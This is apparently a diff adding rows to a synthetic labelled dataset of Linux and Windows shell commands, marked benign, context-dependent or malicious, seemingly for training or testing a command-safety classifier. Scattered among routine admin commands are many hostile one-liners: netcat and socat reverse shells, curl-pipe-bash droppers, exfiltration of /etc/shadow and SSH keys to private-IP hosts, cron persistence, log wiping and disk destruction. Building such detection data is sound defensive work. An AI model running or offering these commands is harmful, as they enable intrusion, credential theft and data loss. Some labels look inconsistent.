+pip install react,Benign,Synthetic,Synthetic
+tail -f /var/log/syslog,Benign,Synthetic,Synthetic
+cp /opt/services/app.py /opt/services/app.py.bak,Benign,Synthetic,Synthetic
+chown -R www-data:www-data /home/user,Benign,Synthetic,Synthetic
+echo '* * * * * /tmp/check.sh' | crontab -,Context_Dependent,Synthetic,Synthetic
+apt install -y curl wget,Benign,Synthetic,Synthetic
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f,Malicious,Synthetic,Synthetic
+chmod 700 ~/.ssh,Benign,Synthetic,Synthetic
+nc -zv 192.168.0.10 80,Context_Dependent,Synthetic,Synthetic
+npm install,Benign,Synthetic,Synthetic
+git add -p,Benign,Synthetic,Synthetic
+du -ah /home/deploy | sort -rh | head -10,Benign,Synthetic,Synthetic
+df -i,Benign,Synthetic,Synthetic
+printenv,Benign,Synthetic,Synthetic
+journalctl -u nomad --since '1 hour ago',Benign,Synthetic,Synthetic
+systemctl enable /tmp/malicious.service,Malicious,Synthetic,Synthetic
+cat /proc/uptime,Benign,Synthetic,Synthetic
+cal 2026,Benign,Synthetic,Synthetic
+mount | grep ext4,Benign,Synthetic,Synthetic
+head -50 /etc/nginx/nginx.conf,Benign,Synthetic,Synthetic
+cat /etc/profile,Benign,Synthetic,Synthetic
+gem install rails,Benign,Synthetic,Synthetic
+curl -X POST -d @/home/user/.ssh/id_rsa http://192.168.0.10:5555/exfil,Malicious,Synthetic,Synthetic
+grep -i 'ERROR' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
+exit 0,Benign,Synthetic,Synthetic
+systemctl is-active grafana-server,Benign,Synthetic,Synthetic
+ss -o state established,Benign,Synthetic,Synthetic
+npm audit,Benign,Synthetic,Synthetic
+netstat -i,Benign,Synthetic,Synthetic
+df -h /var/lib,Benign,Synthetic,Synthetic
+killall -HUP nginx,Benign,Synthetic,Synthetic
+atq,Benign,Synthetic,Synthetic
+ls /opt/services/,Benign,Synthetic,Synthetic
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 9001 >/tmp/f,Malicious,Synthetic,Synthetic
+lsof -p 1234,Benign,Synthetic,Synthetic
+lastlog,Benign,Synthetic,Synthetic
+file /usr/bin/python3,Benign,Synthetic,Synthetic
+nproc,Benign,Synthetic,Synthetic
+curl -X POST -d @/etc/sudoers http://172.16.5.10:1234/exfil,Malicious,Synthetic,Synthetic
+traceroute internal-dns,Benign,Synthetic,Synthetic
+systemctl restart grafana-server,Benign,Synthetic,Synthetic
+systemctl restart httpd,Benign,Synthetic,Synthetic
+bc -l <<< '2^10',Benign,Synthetic,Synthetic
+vim /srv/www/requirements.txt,Benign,Synthetic,Synthetic
+ssh -D 5432 user@server,Context_Dependent,Synthetic,Synthetic
+touch -t 202001010000 /tmp/backdoor,Malicious,Synthetic,Synthetic
+pgrep -la java,Benign,Synthetic,Synthetic
+ls -la /var/lib,Benign,Synthetic,Synthetic
+pgrep -la gunicorn,Benign,Synthetic,Synthetic
+docker inspect --format '{{.State.Status}}' web,Benign,Synthetic,Synthetic
+docker exec app ls /app,Benign,Synthetic,Synthetic
+vim /opt/app/backup.sh,Benign,Synthetic,Synthetic
+ssh admin@production 'uptime',Benign,Synthetic,Synthetic
+"nmap -p 22,80,443 192.168.1.100",Context_Dependent,Synthetic,Synthetic
+ls -lt /home/admin | head -10,Benign,Synthetic,Synthetic
+dig 8.8.8.8,Benign,Synthetic,Synthetic
+docker build -t myapp:latest .,Benign,Synthetic,Synthetic
+docker run -v /:/host --privileged -it alpine chroot /host /bin/bash,Malicious,Synthetic,Synthetic
+journalctl -u logstash --since '1 hour ago',Benign,Synthetic,Synthetic
+tshark -i eth0 -f 'port 443',Context_Dependent,Synthetic,Synthetic
+ifconfig eth0,Benign,Synthetic,Synthetic
+chmod 4755 /bin/dash,Malicious,Synthetic,Synthetic
+find / -perm -2000 -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
+chmod 700 Makefile,Benign,Synthetic,Synthetic
+apt-get upgrade -y,Benign,Synthetic,Synthetic
+ufw status verbose,Benign,Synthetic,Synthetic
+df -h /home/deploy,Benign,Synthetic,Synthetic
+uname,Benign,Synthetic,Synthetic
+grep -r 'BEGIN RSA' /home/,Context_Dependent,Synthetic,Synthetic
+sha256sum important_file.tar.gz,Benign,Synthetic,Synthetic
+find / -name '.env' -exec cat {} \; 2>/dev/null,Malicious,Synthetic,Synthetic
+conda install numpy,Benign,Synthetic,Synthetic
+docker exec proxy ls /app,Benign,Synthetic,Synthetic
+pidof redis,Benign,Synthetic,Synthetic
+find / -name '*.key' 2>/dev/null,Context_Dependent,Synthetic,Synthetic
+cp /home/user/main.go /home/user/main.go.bak,Benign,Synthetic,Synthetic
+nc -lvnp 4444,Context_Dependent,Synthetic,Synthetic
+tee -a output.log,Benign,Synthetic,Synthetic
+du -sh /home/admin,Benign,Synthetic,Synthetic
+curl -I https://google.com,Benign,Synthetic,Synthetic
+getconf LONG_BIT,Benign,Synthetic,Synthetic
+cargo run --release,Benign,Synthetic,Synthetic
+chown nginx:nginx /srv/www,Benign,Synthetic,Synthetic
+ls -lah /srv/www,Benign,Synthetic,Synthetic
+screen -dmS hidden /tmp/script.sh,Context_Dependent,Synthetic,Synthetic
+systemctl status nomad,Benign,Synthetic,Synthetic
+ls -lah /home/deploy,Benign,Synthetic,Synthetic
+curl http://10.0.0.1:8080/shell.py | python3,Malicious,Synthetic,Synthetic
+git fetch --all,Benign,Synthetic,Synthetic
+journalctl -u rabbitmq-server --since '1 hour ago',Benign,Synthetic,Synthetic
+vim /opt/services/app.py,Benign,Synthetic,Synthetic
+mv /opt/services/Makefile.old /opt/services/Makefile,Benign,Synthetic,Synthetic
+ln -sf /tmp/backdoor /etc/cron.d/update,Malicious,Synthetic,Synthetic
+systemctl restart cron,Benign,Synthetic,Synthetic
+dd if=/dev/sda of=/tmp/disk.img bs=4M,Context_Dependent,Synthetic,Synthetic
+cat /proc/cpuinfo,Benign,Synthetic,Synthetic
+apt install -y nginx,Benign,Synthetic,Synthetic
+journalctl -u kibana --no-pager -n 20,Benign,Synthetic,Synthetic
+kill -HUP $(pidof nginx),Benign,Synthetic,Synthetic
+ltrace ls,Benign,Synthetic,Synthetic
+wget http://172.16.5.10:443/agent -O /dev/shm/.proc/agent && chmod +x /dev/shm/.proc/agent && /dev/shm/.proc/agent,Malicious,Synthetic,Synthetic
+echo 'command' | base64,Context_Dependent,Synthetic,Synthetic
+du -ah /opt/services | sort -rh | head -10,Benign,Synthetic,Synthetic
+nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash,Malicious,Synthetic,Synthetic
+cp /run/shm/backdoor /usr/local/bin/.update && chmod +x /usr/local/bin/.update,Malicious,Synthetic,Synthetic
+pgrep -la mysql,Benign,Synthetic,Synthetic
+vim /opt/services/deploy.sh,Benign,Synthetic,Synthetic
+"python3 -c ""import urllib.request; exec(urllib.request.urlopen('http://10.0.0.1/payload.py').read())""",Malicious,Synthetic,Synthetic
+git push origin main,Benign,Synthetic,Synthetic
+tshark -i eth0,Context_Dependent,Synthetic,Synthetic
+systemctl status prometheus,Benign,Synthetic,Synthetic
+ssh admin@web-01,Benign,Synthetic,Synthetic
+curl -X POST -d @/etc/sudoers http://192.168.56.1:4443/exfil,Malicious,Synthetic,Synthetic
+docker rmi old-image:v1,Benign,Synthetic,Synthetic
+python3 manage.py collectstatic --noinput,Benign,Synthetic,Synthetic
+nano /opt/app/backup.sh,Benign,Synthetic,Synthetic
+cargo test,Benign,Synthetic,Synthetic
+bridge link,Benign,Synthetic,Synthetic
+pgrep -la postgres,Benign,Synthetic,Synthetic
+nmap -sV 172.16.5.10,Context_Dependent,Synthetic,Synthetic
+ssh deploy@staging 'uptime',Benign,Synthetic,Synthetic
+yes | head -5,Benign,Synthetic,Synthetic
+tmux ls,Benign,Synthetic,Synthetic
+docker restart worker,Benign,Synthetic,Synthetic
+ssh -R 8080:localhost:80 user@server,Context_Dependent,Synthetic,Synthetic
+systemctl status mysql,Benign,Synthetic,Synthetic
+service nginx status,Benign,Synthetic,Synthetic
+cp /var/www/Dockerfile /var/www/Dockerfile.bak,Benign,Synthetic,Synthetic
+docker logs db,Benign,Synthetic,Synthetic
+at -f /tmp/task.sh now + 1 minute,Context_Dependent,Synthetic,Synthetic
+rsync -avz --delete src/ dest/,Benign,Synthetic,Synthetic
+masscan -p1-1000 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
+(crontab -l; echo '*/5 * * * * curl http://172.16.0.1/9090/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
+docker pull python:3.11-slim,Benign,Synthetic,Synthetic
+dpkg -l | grep nginx,Benign,Synthetic,Synthetic
+docker inspect app,Benign,Synthetic,Synthetic
+systemctl is-active vault,Benign,Synthetic,Synthetic
+systemctl status kibana,Benign,Synthetic,Synthetic
+systemctl enable nginx,Benign,Synthetic,Synthetic
+lastlog -u $USER,Benign,Synthetic,Synthetic
+rm -rf / --no-preserve-root,Malicious,Synthetic,Synthetic
+curl http://172.16.0.50:8080/dropper | bash,Malicious,Synthetic,Synthetic
+echo -n 'test' | xxd,Context_Dependent,Synthetic,Synthetic
+journalctl -u cron --no-pager -n 20,Benign,Synthetic,Synthetic
+rsync -avz -e ssh /data/ user@backup:/data/,Benign,Synthetic,Synthetic
+cat /proc/version && uname -a && cat /etc/os-release,Malicious,Synthetic,Synthetic
+vim /home/user/projects/server.js,Benign,Synthetic,Synthetic
+journalctl -u sshd --since today,Benign,Synthetic,Synthetic
+"nmap -p 22,80,443 192.168.0.10",Context_Dependent,Synthetic,Synthetic
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.0.50 7777 >/tmp/f,Malicious,Synthetic,Synthetic
+sudo ufw enable,Benign,Synthetic,Synthetic
+snap install lxd,Benign,Synthetic,Synthetic
+chmod 600 ~/.ssh/id_rsa,Benign,Synthetic,Synthetic
+mvn test,Benign,Synthetic,Synthetic
+curl -X POST -d @/etc/ssh/sshd_config http://10.100.200.1:9001/exfil,Malicious,Synthetic,Synthetic
+docker logs worker,Benign,Synthetic,Synthetic
+pip install --upgrade requests,Benign,Synthetic,Synthetic
+systemctl reload nginx,Benign,Synthetic,Synthetic
+grep -v '^#' /etc/redis/redis.conf,Benign,Synthetic,Synthetic
+curl http://192.168.1.50:80/shell.sh | bash,Malicious,Synthetic,Synthetic
+df -h,Benign,Synthetic,Synthetic
+journalctl -u apache2 --since '1 hour ago',Benign,Synthetic,Synthetic
+vim /home/user/main.go,Benign,Synthetic,Synthetic
+nmap -sV 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
+cat /etc/fstab,Benign,Synthetic,Synthetic
+pip install express,Benign,Synthetic,Synthetic
+ls -lah /opt/app,Benign,Synthetic,Synthetic
+curl -X POST -d @/etc/shadow http://10.0.0.1:9090/exfil,Malicious,Synthetic,Synthetic
+grep -c 'Exception' /var/log/syslog,Benign,Synthetic,Synthetic
+grep -r password /var/www/html/,Malicious,Synthetic,Synthetic
+curl http://172.16.0.1:8080/beacon.sh | bash,Malicious,Synthetic,Synthetic
+watch -n 1 'cat /proc/net/tcp',Context_Dependent,Synthetic,Synthetic
+curl http://10.100.200.1:80/rev.py | bash,Malicious,Synthetic,Synthetic
+nano /opt/services/README.md,Benign,Synthetic,Synthetic
+kill -0 1234,Benign,Synthetic,Synthetic
+chown -R nginx:nginx /home/admin,Benign,Synthetic,Synthetic
+docker logs --tail 200 api,Benign,Synthetic,Synthetic
+df -h /etc/nginx,Benign,Synthetic,Synthetic
+hexdump -C /dev/urandom | head -5,Benign,Synthetic,Synthetic
+ncdu /var/log,Benign,Synthetic,Synthetic
+python3 setup.py install,Benign,Synthetic,Synthetic
+strings /dev/mem | grep -i password,Context_Dependent,Synthetic,Synthetic
+inotifywait -m /etc/ -e modify,Context_Dependent,Synthetic,Synthetic
+openssl enc -d -aes-256-cbc -in file.enc -out file.txt,Context_Dependent,Synthetic,Synthetic
+wbadmin delete systemstatebackup -keepVersions:0,Malicious,Synthetic,Synthetic
+echo 'hello world',Benign,Synthetic,Synthetic
+nc -e /bin/bash 172.16.5.10 8080,Malicious,Synthetic,Synthetic
+xxd /root/.ssh/id_rsa | nc 10.0.0.1 5555,Malicious,Synthetic,Synthetic
+for i in $(seq 1 254); do ssh -o ConnectTimeout=1 root@10.0.0.$i 'id' 2>/dev/null; done,Malicious,Synthetic,Synthetic
+pip install lodash,Benign,Synthetic,Synthetic
+vim /var/www/html/backup.sh,Benign,Synthetic,Synthetic
+nano /tmp/README.md,Benign,Synthetic,Synthetic
+systemctl is-active postgresql,Benign,Synthetic,Synthetic
+git commit -m 'fix: update config',Benign,Synthetic,Synthetic
+ssh -R 6379:localhost:6379 user@external,Context_Dependent,Synthetic,Synthetic
+docker inspect db,Benign,Synthetic,Synthetic
+mv /opt/services/server.js.old /opt/services/server.js,Benign,Synthetic,Synthetic
+id -g,Benign,Synthetic,Synthetic
+systemctl restart rabbitmq-server,Benign,Synthetic,Synthetic
+strace -p 1234 -e trace=network,Benign,Synthetic,Synthetic
+ls -la /opt/app,Benign,Synthetic,Synthetic
+nc -e /bin/bash 172.16.5.10 31337,Malicious,Synthetic,Synthetic
+[[ -d /var/log ]] && echo 'dir exists',Benign,Synthetic,Synthetic
+cat ~/.gitconfig,Benign,Synthetic,Synthetic
+ls -la /home/,Context_Dependent,Synthetic,Synthetic
+ifconfig -a,Benign,Synthetic,Synthetic
+pip install --upgrade typescript,Benign,Synthetic,Synthetic
+vssadmin delete shadows /all /quiet,Malicious,Synthetic,Synthetic
+mv /opt/services/README.md.old /opt/services/README.md,Benign,Synthetic,Synthetic
+rsync -avz /home/user/.ssh/ attacker@10.0.0.1:/loot/,Malicious,Synthetic,Synthetic
+ls -lah /etc/nginx,Benign,Synthetic,Synthetic
+docker ps --format '{{.Names}}',Benign,Synthetic,Synthetic
+ps aux | grep nginx,Benign,Synthetic,Synthetic
+ls -lt /var/log | head -10,Benign,Synthetic,Synthetic
+ls -la /usr/local/bin,Benign,Synthetic,Synthetic
+"socat TCP-LISTEN:31337,fork -",Context_Dependent,Synthetic,Synthetic
+grep -v '^#' /etc/nginx/nginx.conf,Benign,Synthetic,Synthetic
+pip install --upgrade uvicorn,Benign,Synthetic,Synthetic
+tail -f /var/log/nginx/error.log,Benign,Synthetic,Synthetic
+cat /proc/self/environ | tr '\0' '\n' | grep -i password,Malicious,Synthetic,Synthetic
+nc -zv 192.168.0.10 1-1000,Context_Dependent,Synthetic,Synthetic
+kubectl rollout restart deployment/web,Benign,Synthetic,Synthetic
+cp /tmp/backdoor /usr/local/bin/.update && chmod +x /usr/local/bin/.update,Malicious,Synthetic,Synthetic
+grep -ri 'api_key' /home/,Context_Dependent,Synthetic,Synthetic
+mv /home/deploy/deploy.sh.old /home/deploy/deploy.sh,Benign,Synthetic,Synthetic
+cat /etc/sudoers,Context_Dependent,Synthetic,Synthetic
+docker system df,Benign,Synthetic,Synthetic
+sha256sum image.iso,Benign,Synthetic,Synthetic
+gpasswd -a user docker,Benign,Synthetic,Synthetic
+cat /etc/debian_version,Benign,Synthetic,Synthetic
+snap list,Benign,Synthetic,Synthetic
+tail -50 /var/log/auth.log,Benign,Synthetic,Synthetic
+nslookup 8.8.8.8,Benign,Synthetic,Synthetic
+zip -r backup.zip /var/www/html,Benign,Synthetic,Synthetic
+chmod 644 healthcheck.sh,Benign,Synthetic,Synthetic
+kill -HUP $(pidof node),Benign,Synthetic,Synthetic
+"python3 -c 'import os; os.setuid(0); os.system(""/bin/bash"")'",Malicious,Synthetic,Synthetic
+wget http://172.16.0.50:8443/implant -O /tmp/.hidden/implant && chmod +x /tmp/.hidden/implant && /tmp/.hidden/implant,Malicious,Synthetic,Synthetic
+kill -HUP $(pidof redis),Benign,Synthetic,Synthetic
+vim /home/user/projects/README.md,Benign,Synthetic,Synthetic
+nano /home/deploy/requirements.txt,Benign,Synthetic,Synthetic
+base64 /opt/app/.env | curl -d @- http://192.168.56.1:6666/,Malicious,Synthetic,Synthetic
+ncat -lvnp 1234,Context_Dependent,Synthetic,Synthetic
+pip install --upgrade react,Benign,Synthetic,Synthetic
+vim /var/lib/main.go,Benign,Synthetic,Synthetic
+chown www-data:www-data /var/www/html,Benign,Synthetic,Synthetic
+pidof gunicorn,Benign,Synthetic,Synthetic
+echo $JAVA_HOME,Benign,Synthetic,Synthetic
+cron -f,Benign,Synthetic,Synthetic
+docker exec web ls /app,Benign,Synthetic,Synthetic
+resolvectl status,Benign,Synthetic,Synthetic
+ufw status,Benign,Synthetic,Synthetic
+update-rc.d nginx defaults,Benign,Synthetic,Synthetic
+useradd -m -s /bin/bash newuser,Benign,Synthetic,Synthetic
+php -S 0.0.0.0:8080,Context_Dependent,Synthetic,Synthetic
+nmap -sV 192.168.1.100,Context_Dependent,Synthetic,Synthetic
+renice -n 5 -p 1234,Benign,Synthetic,Synthetic
+nmap -sV 172.16.0.0/24,Context_Dependent,Synthetic,Synthetic
+git remote -v,Benign,Synthetic,Synthetic
+pip show pandas,Benign,Synthetic,Synthetic
+gcc -Wall -O2 -o app app.c,Benign,Synthetic,Synthetic
+ip6tables -L -n,Benign,Synthetic,Synthetic
+scp /etc/shadow attacker@10.0.0.1:/tmp/,Malicious,Synthetic,Synthetic
+ssh -L 5432:localhost:5432 user@jump,Context_Dependent,Synthetic,Synthetic
+echo $PATH,Benign,Synthetic,Synthetic
+make -j$(nproc),Benign,Synthetic,Synthetic
+groups,Benign,Synthetic,Synthetic
+sleep 5,Benign,Synthetic,Synthetic
+mv /home/deploy/index.html.old /home/deploy/index.html,Benign,Synthetic,Synthetic
+ncat -lvnp 8443,Context_Dependent,Synthetic,Synthetic
+nc -lvnp 5555,Context_Dependent,Synthetic,Synthetic
+whoami,Benign,Synthetic,Synthetic
+hdparm -I /dev/sda,Benign,Synthetic,Synthetic
+brctl show,Benign,Synthetic,Synthetic
+docker volume inspect data,Benign,Synthetic,Synthetic
+python3 setup.py test,Benign,Synthetic,Synthetic
+tune2fs -l /dev/sda1,Benign,Synthetic,Synthetic
+cat /etc/mysql/my.cnf,Benign,Synthetic,Synthetic
+ls -la /home/*/.ssh/ 2>/dev/null,Malicious,Synthetic,Synthetic
+rpm -qi openssh-server,Benign,Synthetic,Synthetic
+dpkg -L nginx,Benign,Synthetic,Synthetic
+ls -la /etc/cron.d/,Benign,Synthetic,Synthetic
+systemd-resolve --status,Benign,Synthetic,Synthetic
+cd /tmp && curl -O http://10.0.0.1/elf && chmod 755 elf && ./elf,Malicious,Synthetic,Synthetic
+kill -HUP $(pidof python),Benign,Synthetic,Synthetic
+dirname /path/to/file.txt,Benign,Synthetic,Synthetic
+cat /var/www/html/wp-config.php,Malicious,Synthetic,Synthetic
+mv /srv/www/settings.json.old /srv/www/settings.json,Benign,Synthetic,Synthetic
+nc -lvnp 8080,Context_Dependent,Synthetic,Synthetic
+"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.10:9001",Malicious,Synthetic,Synthetic
+brew install wget,Benign,Synthetic,Synthetic
+docker exec -it cache bash,Benign,Synthetic,Synthetic
+lsof -u www-data,Benign,Synthetic,Synthetic
+cat /var/lib/mysql/data/*.frm | gzip | nc 10.0.0.1 6666,Malicious,Synthetic,Synthetic
+cat /etc/crontab,Benign,Synthetic,Synthetic
+ncat -lvnp 4443,Context_Dependent,Synthetic,Synthetic
+find / -name 'wp-config.php' -exec cat {} \; 2>/dev/null,Malicious,Synthetic,Synthetic
+lsblk -f,Benign,Synthetic,Synthetic
+traceroute google.com,Benign,Synthetic,Synthetic
+tc class show dev eth0,Benign,Synthetic,Synthetic
+vim /opt/services/Makefile,Benign,Synthetic,Synthetic
+journalctl -u haproxy --since '1 hour ago',Benign,Synthetic,Synthetic
+wget --spider https://example.com,Benign,Synthetic,Synthetic
+pkill -USR1 nginx,Benign,Synthetic,Synthetic
+mv /srv/www/nginx.conf.old /srv/www/nginx.conf,Benign,Synthetic,Synthetic
+xz database.sql,Benign,Synthetic,Synthetic
+ping -c 4 8.8.8.8,Benign,Synthetic,Synthetic
+git log --oneline -10,Benign,Synthetic,Synthetic
+ssh admin@db-01 'uptime',Benign,Synthetic,Synthetic
+mv /home/user/projects/config.yaml.old /home/user/projects/config.yaml,Benign,Synthetic,Synthetic
+nano /srv/www/nginx.conf,Benign,Synthetic,Synthetic
+cp /home/deploy/index.html /home/deploy/index.html.bak,Benign,Synthetic,Synthetic
+updatedb,Benign,Synthetic,Synthetic
+chown www-data:www-data /home/user,Benign,Synthetic,Synthetic
+sudo -u root /bin/bash,Malicious,Synthetic,Synthetic
+grep -i 'refused' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
+export HISTSIZE=0,Malicious,Synthetic,Synthetic
+screen -S session1,Benign,Synthetic,Synthetic
+grep -i 'Exception' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
+tracepath google.com,Benign,Synthetic,Synthetic
+netstat -s,Benign,Synthetic,Synthetic
+sudo iptables -L -n,Benign,Synthetic,Synthetic
+setfacl -m u:deploy:rwx /opt/app,Benign,Synthetic,Synthetic
+netdiscover -r 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
+cal -3,Benign,Synthetic,Synthetic
+shred -vfz -n 5 /dev/sda,Malicious,Synthetic,Synthetic
+echo '#!/bin/bash\ncurl http://10.0.0.1/shell|bash' > /etc/cron.daily/update,Malicious,Synthetic,Synthetic
+systemctl restart postgresql,Benign,Synthetic,Synthetic
+brew list,Benign,Synthetic,Synthetic
+parallel echo ::: a b c,Benign,Synthetic,Synthetic
+git switch -c feature/auth,Benign,Synthetic,Synthetic
+ls -la /var/log/,Benign,Synthetic,Synthetic
+find / -perm -4000 -type f 2>/dev/null,Benign,Synthetic,Synthetic
+mv /opt/app/backup.sh.old /opt/app/backup.sh,Benign,Synthetic,Synthetic
+echo '' > /var/log/lastlog,Malicious,Synthetic,Synthetic
+vim /var/lib/docker-compose.yml,Benign,Synthetic,Synthetic
+npm run build,Benign,Synthetic,Synthetic
+"socat TCP-LISTEN:8080,fork -",Context_Dependent,Synthetic,Synthetic
+git diff,Benign,Synthetic,Synthetic
+cp /home/deploy/healthcheck.sh /home/deploy/healthcheck.sh.bak,Benign,Synthetic,Synthetic
+cat /proc/1234/cmdline,Benign,Synthetic,Synthetic
+false,Benign,Synthetic,Synthetic
+git checkout -b new-feature,Benign,Synthetic,Synthetic
+nc -lvnp 31337,Context_Dependent,Synthetic,Synthetic
+make test,Benign,Synthetic,Synthetic
+cat /dev/null > ~/.bash_history && history -c,Malicious,Synthetic,Synthetic
+grep -c 'traceback' /var/log/syslog,Benign,Synthetic,Synthetic
+sudo -l,Benign,Synthetic,Synthetic
+cp /opt/app/app.py /opt/app/app.py.bak,Benign,Synthetic,Synthetic
+zip -r /tmp/loot.zip /home/ && curl -F 'f=@/tmp/loot.zip' http://10.0.0.1/,Malicious,Synthetic,Synthetic
+echo '/dev/shm/.proc/.implant &' >> /etc/rc.local,Malicious,Synthetic,Synthetic
+base64 /etc/sudoers | curl -d @- http://10.10.14.3:1337/,Malicious,Synthetic,Synthetic
+docker restart app,Benign,Synthetic,Synthetic
+ls /var/www/,Benign,Synthetic,Synthetic
+ruby -run -e httpd . -p 8080,Context_Dependent,Synthetic,Synthetic
+cat /etc/hosts | grep -v '^#',Malicious,Synthetic,Synthetic
+nslookup api.company.com,Benign,Synthetic,Synthetic
+dig lb-01,Benign,Synthetic,Synthetic
+du -ah /var/www | sort -rh | head -10,Benign,Synthetic,Synthetic
+fail2ban-client status sshd,Benign,Synthetic,Synthetic
+uvicorn main:app --reload,Benign,Synthetic,Synthetic
+wmiexec.py admin:password@10.0.0.2,Malicious,Synthetic,Synthetic
+conda list,Benign,Synthetic,Synthetic
+tmux attach -t work,Benign,Synthetic,Synthetic
+grep -i fail /var/log/auth.log,Benign,Synthetic,Synthetic
+arch,Benign,Synthetic,Synthetic
+cp /var/www/html/settings.json /var/www/html/settings.json.bak,Benign,Synthetic,Synthetic
+cp /opt/services/Makefile /opt/services/Makefile.bak,Benign,Synthetic,Synthetic
+vim /home/user/nginx.conf,Benign,Synthetic,Synthetic
+python3 -m unittest discover,Benign,Synthetic,Synthetic
+pip install --upgrade redis,Benign,Synthetic,Synthetic
+timestomp /tmp/backdoor -m '2020-01-01 00:00:00',Malicious,Synthetic,Synthetic
+echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && systemctl restart sshd,Malicious,Synthetic,Synthetic
+python3 manage.py runserver,Benign,Synthetic,Synthetic
+cat /etc/anacrontab,Benign,Synthetic,Synthetic
+git fetch origin,Benign,Synthetic,Synthetic
+mv /opt/services/deploy.sh.old /opt/services/deploy.sh,Benign,Synthetic,Synthetic
+uptime,Benign,Synthetic,Synthetic
+wget http://172.16.0.50:80/implant -O /dev/shm/implant && chmod +x /dev/shm/implant && /dev/shm/implant,Malicious,Synthetic,Synthetic
+ssh-keygen -t ed25519 -C 'user@host',Benign,Synthetic,Synthetic
+ssh deploy@db-01 'uptime',Benign,Synthetic,Synthetic
+find /var/log -name '*.gz' -mtime +90,Benign,Synthetic,Synthetic
+ls -lt /home/user/projects | head -10,Benign,Synthetic,Synthetic
+ssh user@server 'df -h',Benign,Synthetic,Synthetic
+grep -v '^#' /etc/postgresql/14/main/pg_hba.conf,Benign,Synthetic,Synthetic
+pip install -r requirements.txt,Benign,Synthetic,Synthetic
+mv /tmp/Makefile.old /tmp/Makefile,Benign,Synthetic,Synthetic
+find / -name authorized_keys 2>/dev/null,Context_Dependent,Synthetic,Synthetic
+ls -lt /opt/app | head -10,Benign,Synthetic,Synthetic
+nc -zv 192.168.1.50 1-1000,Context_Dependent,Synthetic,Synthetic
+env,Benign,Synthetic,Synthetic
+cat ~/.ssh/authorized_keys,Context_Dependent,Synthetic,Synthetic
+cat /proc/self/status,Context_Dependent,Synthetic,Synthetic
+du -sh /var/www/html,Benign,Synthetic,Synthetic
+tmux new -d -s session '/tmp/agent.sh',Context_Dependent,Synthetic,Synthetic
+nc -zv 192.168.1.50 22,Context_Dependent,Synthetic,Synthetic
+vim /srv/www/settings.json,Benign,Synthetic,Synthetic
+mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.0.0.1 4444 1>/tmp/backpipe,Malicious,Synthetic,Synthetic
+cat ~/.bash_profile,Benign,Synthetic,Synthetic
+npx eslint src/,Benign,Synthetic,Synthetic
+ls /home/user/,Benign,Synthetic,Synthetic
+groupmod -n newname oldname,Benign,Synthetic,Synthetic
+grep -c 'timeout' /var/log/syslog,Benign,Synthetic,Synthetic
+grep -ri password /var/www/,Context_Dependent,Synthetic,Synthetic
+cat /etc/passwd | nc 10.0.0.5 8080,Malicious,Synthetic,Synthetic
+mv /var/lib/docker-compose.yml.old /var/lib/docker-compose.yml,Benign,Synthetic,Synthetic
+"socat TCP-LISTEN:1337,fork -",Context_Dependent,Synthetic,Synthetic
+su - root -c 'apt update',Benign,Synthetic,Synthetic
+nano /etc/nginx/deploy.sh,Benign,Synthetic,Synthetic
+nmap -sn 172.16.0.0/24,Context_Dependent,Synthetic,Synthetic
+pidof mysql,Benign,Synthetic,Synthetic
+fdisk -l,Benign,Synthetic,Synthetic
+cp /home/user/projects/server.js /home/user/projects/server.js.bak,Benign,Synthetic,Synthetic
+journalctl -u postgresql --no-pager -n 20,Benign,Synthetic,Synthetic
+pidof postgres,Benign,Synthetic,Synthetic
+ps aux | grep java,Benign,Synthetic,Synthetic
+vim /srv/www/Makefile,Benign,Synthetic,Synthetic
+arp -a && ip neigh && cat /proc/net/arp,Malicious,Synthetic,Synthetic
+date -u,Benign,Synthetic,Synthetic
+ls -la /opt/services,Benign,Synthetic,Synthetic
+mount /dev/sda1 /mnt && chroot /mnt /bin/bash,Malicious,Synthetic,Synthetic
+nmap localhost,Benign,Synthetic,Synthetic
+systemctl is-active sshd,Benign,Synthetic,Synthetic
+find /var/log -name '*.log' -exec grep -l 'password' {} \;,Context_Dependent,Synthetic,Synthetic
+vim /home/user/monitor.py,Benign,Synthetic,Synthetic
+tail -20 /etc/nginx/nginx.conf,Benign,Synthetic,Synthetic
+ip route show,Benign,Synthetic,Synthetic
+du -ah /home/user | sort -rh | head -10,Benign,Synthetic,Synthetic
+chmod 644 index.html,Benign,Synthetic,Synthetic
+ssh admin@db-01,Benign,Synthetic,Synthetic
+"column -t -s, data.csv | head",Benign,Synthetic,Synthetic
+ls -la /etc/apache2/sites-enabled/,Benign,Synthetic,Synthetic
+gunicorn app:app --bind 0.0.0.0:8000,Benign,Synthetic,Synthetic
+nmap -sn 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
+cat /etc/hosts,Benign,Synthetic,Synthetic
+git remote show origin,Benign,Synthetic,Synthetic
+systemctl restart nomad,Benign,Synthetic,Synthetic
+systemctl is-active rsyslog,Benign,Synthetic,Synthetic
+nc 10.0.0.1 80,Context_Dependent,Synthetic,Synthetic
+base64 certificate.pem,Benign,Synthetic,Synthetic
+lshw -short,Benign,Synthetic,Synthetic
+curl -s http://10.10.14.3/shell.sh -o /run/shm/.shell.sh && bash /run/shm/.shell.sh,Malicious,Synthetic,Synthetic
+tar czf - /home/ | nc 10.0.0.1 8888,Malicious,Synthetic,Synthetic
+od -A x -t x1z -v /dev/urandom | head -5,Benign,Synthetic,Synthetic
+docker inspect web,Benign,Synthetic,Synthetic
+dig api.company.com,Benign,Synthetic,Synthetic
+ssh ubuntu@staging,Benign,Synthetic,Synthetic
+ssh ubuntu@db-01 'uptime',Benign,Synthetic,Synthetic
+docker-compose up -d,Benign,Synthetic,Synthetic
